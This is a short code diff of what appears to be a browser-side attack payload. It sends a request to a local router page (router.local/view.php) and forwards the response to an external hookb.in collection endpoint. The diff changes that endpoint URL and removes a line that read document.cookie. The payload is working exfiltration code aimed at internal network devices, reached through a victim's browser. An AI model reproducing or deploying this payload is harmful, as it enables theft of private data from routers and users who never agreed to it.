@@ -1,13 +1,12 @@
 const http = new XMLHttpRequest();
 //http.open('POST', 'http://router.local/login.php', true);
-const cook = document.cookie;
 http.open('POST', 'http://router.local/view.php', true);
 
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/r107wynrJKFqk2XXB3MR', true);
+                xhr.open('POST', 'https://hookb.in/oX0YEDnGpKtBnPZZXkbe', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
                 xhr.send(JSON.stringify(http.responseText));
 
